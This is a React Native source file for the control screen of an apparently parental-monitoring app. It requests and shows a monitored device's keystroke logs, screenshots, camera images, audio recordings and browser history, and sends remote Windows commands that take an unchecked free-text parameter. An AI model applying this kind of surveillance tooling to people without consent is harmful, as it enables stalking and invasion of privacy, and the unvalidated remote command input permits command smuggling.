import { React, useState, useEffect } from "react";
import { Pressable, Text, Modal, Image, ScrollView } from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { View, FlatList, TextInput } from "react-native-web";
import { Picker } from "@react-native-picker/picker";
import Checkbox from "expo-checkbox";
import { FontAwesome, MaterialIcons } from "@expo/vector-icons";
import base64 from "react-native-base64";
import ParentMenu from "../components/ParentMenu";
import global from "../config/global";
import colors from "../config/colors";
import sizes from "../config/sizes";

const Request = ({ route, navigation }) => {
  const [data, setData] = useState([]);
  const [specificData, setSpecificData] = useState([]);
  const [refresh, setRefresh] = useState(true);
  //const [pageCurrent, setPageCurrent] = useState(1);
  //const [dataCounter, setDataCounter] = useState(0);
  const [modalVisible, setModalVisible] = useState(false);
  const [modalConfigVisible, setModalConfigVisible] = useState(false);
  //const [processButtonVisible, setProcessButtonVisible] = useState(false);
  const [browser, setBrowser] = useState("");
  const [cmdType, setCmpType] = useState("");
  const [cmdParam, setCmdParam] = useState("");
  const [fakenews, setFakenews] = useState(false);
  const [gambling, setGambling] = useState(false);
  const [porn, setPorn] = useState(false);
  const [social, setSocial] = useState(false);
  const [specificUrl, setSpecificUrl] = useState("");
  const { uid } = route.params;
  const { name } = route.params;
  const { type } = route.params;

  useEffect(() => {
    if (!refresh) return;
    fetch("https://localhost:8010/data/getAll/" + uid + "/" + type, {
      method: "GET",
      credentials: "include",
      headers: {
        Accept: "application/json",
      },
    })
      .then((response) => response.json())
      .then((responseJson) => {
        setData(responseJson);
        // console.log("@@@@@@", pageCurrent);
        //console.log("!!!!!!!", dataCounter);
      });
    setRefresh(false);
  }, [refresh]); //, pageCurrent]);

  const checkRequestButton = () => {
    switch (type) {
      case "KEYLOG":
        break;
      case "HISTORY":
        return (
          <Pressable
            onPress={() => checkConfig()}
            style={global.AddRequestButton}
          >
            <Text style={global.ButtonText}>Download browser history</Text>
          </Pressable>
        );
      default:
        return (
          <Pressable
            onPress={() => checkConfig()}
            style={global.AddRequestButton}
          >
            <Text style={global.ButtonText}>
              Add {type.toLowerCase()} request
            </Text>
          </Pressable>
        );
    }
  };

  const checkConfig = () => {
    switch (type) {
      case "COMMAND":
      case "HISTORY":
      case "CONFIGURATION":
        setModalConfigVisible(true);
        break;
      default:
        addRequest();
        break;
    }
  };

  const addRequest = () => {
    let dataAttr;
    if (type == "COMMAND") {
      dataAttr = {
        REQUEST_TYPE: type,
        COMMAND_TYPE: cmdType,
        COMMAND_PARAMETER: cmdParam,
      };
    } else if(type == "CONFIGURATION") {
      dataAttr = {
        FAKENEWS: fakenews,
        GAMBLING: gambling,
        PORN: porn,
        SOCIAL: social,
      };
    } else {
      dataAttr = { REQUEST_TYPE: type };
    }
    fetch("https://localhost:8010/data/add/" + uid, {
      method: "POST",
      credentials: "include",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        dataType: "REQUEST",
        dataAttributes: dataAttr,
      }),
    })
      .then((response) => {
        if (response.ok) {
          alert("The request has been sent.");
          //return showDeleteProcessButton();
          //setDataCounter(dataCounter + 1);
          //checkPage(dataCounter);
        } else {
          alert("There is an already pending request.");
        }
        return response.json(type);
      })
      .then((responseJson) => {
        console.log(responseJson);
      })
      .catch((error) => {
        console.log("error: " + error);
      });
  };

  /*
  const showDeleteProcessButton = () => {
    console.log("LIRAMI");
    setProcessButtonVisible(!processButtonVisible);
    switch (type) {
      case "KEYLOG":
      case "HISTORY":
        break;
      default:
        return (
            <Pressable
              onPress={navigation.navigate("Request")}
              style={global.AddRequestButton}
            >
              <Text style={global.ButtonText}>Cancel last request</Text>
            </Pressable>
        );
    }
  };
  */

  const getSpecificData = (dataId) => {
    fetch("https://localhost:8010/data/get/" + uid + "/" + dataId, {
      method: "GET",
      credentials: "include",
      headers: {
        Accept: "application/json",
      },
    })
      .then((response) => response.json())
      .then((responseJson) => {
        setSpecificData(responseJson.dataAttributes.DATA);
      })
      .catch((error) => {
        console.log("error: " + error);
      });
  };

  const deleteData = (dataId) => {
    fetch("https://localhost:8010/data/delete/" + dataId, {
      method: "DELETE",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
      },
    })
      .then((response) => response.json())
      .then(() => setRefresh(true))
      //.then(() => setDataCounter(dataCounter - 1 < 0 ? 0 : dataCounter - 1))
      //.then(() => checkPage(dataCounter))
      .catch((error) => {
        console.log("error: " + error);
      });
  };

  const setComponentType = () => {
    switch (type) {
      case "SCREENSHOT": //bmp
        return (
          <Image
            style={{ width: "100%", height: "100%", resizeMode: "stretch" }}
            source={{ uri: "data:image/bmp;base64," + specificData }}
          />
        );
      case "CAMERA": //png
        return (
          <Image
            style={{ width: "100%", height: "100%", resizeMode: "stretch" }}
            source={{ uri: "data:image/png;base64," + specificData }}
          />
        );
      case "AUDIO": //wav
        let snd = new Audio("data:audio/wav;base64," + specificData);
        return (
          <View>
            <View>
              <Pressable style={global.ButtonList} onPress={() => snd.play()}>
                <Text style={global.ButtonText}>Play</Text>
              </Pressable>
            </View>
            <View>
              <Pressable style={global.ButtonList} onPress={() => snd.pause()}>
                <Text style={global.ButtonText}>Pause</Text>
              </Pressable>
            </View>
            <View>
              <Pressable style={global.ButtonList} onPress={() => snd.load()}>
                <Text style={global.ButtonText}>Stop</Text>
              </Pressable>
            </View>
          </View>
        );
      default: {
        //text
        let decodedData = base64.decode(specificData.toString());
        return (
          <ScrollView>
            <Text>{removeNonAscii(decodedData)}</Text>
          </ScrollView>
        );
      }
    }
  };

  const removeNonAscii = (decodedData) => {
    return decodedData
      .replace(
        /[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\[\]`~/\n]*/g,
        ""
      )
      .replace(/,/g, "\n");
  };

  const setAddRequestComponent = () => {
    switch (type) {
      case "COMMAND":
        return (
          <View>
            <View>
              <Picker
                style={global.TextInput}
                selectedValue={cmdType}
                onValueChange={(itemValue, itemIndex) => setCmpType(itemValue)}
              >
                <Picker.Item label="Show all processes" value="tasklist" />
                <Picker.Item label="Close a program" value="taskkill /IM" />
                <Picker.Item label="Show hidden files" value="dir /AH" />
                <Picker.Item label="Show folders and files" value="dir /ON" />
              </Picker>
            </View>
            <View>{getAdditionalParam(cmdType)}</View>
          </View>
        );
      case "HISTORY":
        return (
          <View>
            <Picker
              style={global.TextInput}
              selectedValue={browser}
              onValueChange={(itemValue, itemIndex) => setBrowser(itemValue)}
            >
              <Picker.Item label="Chrome" value="Chrome" />
              <Picker.Item label="Opera" value="Opera" />
              <Picker.Item label="Brave" value="Brave" />
              <Picker.Item label="Edge" value="Edge" />
            </Picker>
          </View>
        );
      case "CONFIGURATION":
        return (
          <ScrollView>
            <View style={global.CheckboxContainer}>
              <View style={global.CheckboxSection}>
                <Checkbox
                  style={global.Checkbox}
                  value={fakenews}
                  onValueChange={setFakenews}
                />
                <Text style={sizes.FilterTextSize}>Fakenews</Text>
              </View>
              <View style={global.CheckboxSection}>
                <Checkbox
                  style={global.Checkbox}
                  value={gambling}
                  onValueChange={setGambling}
                />
                <Text style={sizes.FilterTextSize}>Gambling</Text>
              </View>
              <View style={global.CheckboxSection}>
                <Checkbox
                  style={global.Checkbox}
                  value={porn}
                  onValueChange={setPorn}
                />
                <Text style={sizes.FilterTextSize}>Porn</Text>
              </View>
              <View style={global.CheckboxSection}>
                <Checkbox
                  style={global.Checkbox}
                  value={social}
                  onValueChange={setSocial}
                />
                <Text style={sizes.FilterTextSize}>Social</Text>
              </View>
              <View>
                <TextInput
                  style={global.TextInputInModal}
                  placeholder="Specific URL"
                  placeholderTextColor={colors.primary}
                  onChangeText={(specificUrl) => setSpecificUrl(specificUrl)}
                />
              </View>
            </View>
          </ScrollView>
        );
      default:
        break;
    }
  };

  const getAdditionalParam = (cmdType) => {
    console.log(cmdType);
    switch (cmdType) {
      case "taskkill /IM":
      case "dir /AH":
      case "dir /ON":
        return (
          <TextInput
            style={global.TextInputInModal}
            placeholder="Additional Param"
            placeholderTextColor={colors.primary}
            onChangeText={(cmdParam) => setCmdParam(cmdParam)}
          />
        );
      default:
        break;
    }
  };

  const handleRefresh = () => {
    setRefresh(true);
  };
  /*
  const checkPage = (dataCounter) => {
    if (dataCounter % 10 == 5 || dataCounter % 10 == 0)
      setPageCurrent(pageCurrent + 1);
  };

  const handlePreviousPage = () => {
    setPageCurrent(pageCurrent - 1 < 1 ? 1 : pageCurrent - 1);
    console.log("previous page clicked", pageCurrent);
  };

  const handleNextPage = () => {
    setPageCurrent(pageCurrent + 1);
    console.log("next page clicked", pageCurrent);
  };
*/
  return (
    <SafeAreaView style={global.pageContainer}>
      <ParentMenu navigation={navigation} />
      <View style={global.rightContainer}>
        <View>
          <Pressable
            style={global.refreshButton}
            onPress={() => handleRefresh()}
          >
            <FontAwesome
              style={global.icon}
              name="refresh"
              size={sizes.refreshIconSize}
              color={colors.primary}
            />
          </Pressable>
        </View>
        <View style={global.headerMenu}>
          <Text style={global.headerText}>
            {name + " - " + type.toLowerCase()}
          </Text>
        </View>
        <View style={global.rightMenu}>
          <View style={global.ArrowView}>
            <Pressable
              style={global.ArrowButton}
              onPress={() => handlePreviousPage()}
            >
              <MaterialIcons
                name="navigate-before"
                size={sizes.PagingArrowIconSize}
                color={colors.primary}
              />
            </Pressable>
            <Pressable
              style={global.ArrowButton}
              onPress={() => handleNextPage()}
            >
              <MaterialIcons
                name="navigate-next"
                size={sizes.PagingArrowIconSize}
                color={colors.primary}
              />
            </Pressable>
          </View>
          <FlatList
            keyExtractor={(item, index) => {
              return index.toString();
            }}
            data={data}
            renderItem={({ item }) => (
              <Pressable
                style={global.ButtonList}
                onPress={() => {
                  setModalVisible(true), getSpecificData(item.dataId);
                }}
              >
                <Text style={global.ButtonText}>
                  {item.dataType} : {item.createdTimestamp} : {item.dataId}
                </Text>
                <Pressable
                  style={global.IconButton}
                  onPress={() => deleteData(item.dataId)}
                >
                  <FontAwesome
                    name="trash-o"
                    size={sizes.iconSize}
                    color={colors.secondary}
                  />
                </Pressable>
              </Pressable>
            )}
          />
          <Modal
            style={global.ModalContainer}
            animationType="fade"
            transparent={true}
            visible={modalVisible}
            onRequestClose={() => setModalVisible(!modalVisible)}
          >
            <View style={global.ModalView}>
              <View style={global.ModalContainer}>
                <View style={global.TopModalView}>{setComponentType()}</View>
                <View style={global.BottomModalView}>
                  <Pressable
                    style={global.buttonClose}
                    onPress={() => setModalVisible(!modalVisible)}
                  >
                    <Text style={global.ButtonText}>Close</Text>
                  </Pressable>
                </View>
              </View>
            </View>
          </Modal>
          <Modal
            style={global.ModalConfigContainer}
            animationType="fade"
            transparent={true}
            visible={modalConfigVisible}
            onRequestClose={() => {
              setModalConfigVisible(!modalConfigVisible);
            }}
          >
            <View style={global.ModalView}>
              <View style={global.ModalConfigContainer}>
                <View style={global.TopModalView}>
                  {setAddRequestComponent()}
                </View>
                <View style={global.BottomModalView}>
                  <Pressable
                    onPress={() => {
                      {
                        addRequest(),
                          setModalConfigVisible(!modalConfigVisible);
                      }
                    }}
                    style={global.buttonClose}
                  >
                    <Text style={global.ButtonText}>Send</Text>
                  </Pressable>
                  <Pressable
                    style={global.buttonClose}
                    onPress={() => setModalConfigVisible(!modalConfigVisible)}
                  >
                    <Text style={global.ButtonText}>Close</Text>
                  </Pressable>
                </View>
              </View>
            </View>
          </Modal>
          {checkRequestButton()}
        </View>
      </View>
    </SafeAreaView>
  );
};

export default Request;
